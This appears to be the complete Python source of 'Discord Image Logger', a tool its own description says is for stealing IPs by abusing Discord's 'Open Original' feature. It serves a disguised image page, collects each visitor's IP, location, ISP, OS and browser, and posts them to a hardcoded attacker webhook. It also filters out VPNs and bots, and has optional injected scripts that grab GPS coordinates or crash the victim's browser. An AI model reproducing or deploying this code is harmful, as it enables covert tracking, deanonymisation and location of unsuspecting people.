# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1337339734074200064/8Ld0QaZHVs3POHssntqPPrBlQ0GdSmTXxHqd_hIPCmEekda2Zjq-m0JiTt3exyunnUL1",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
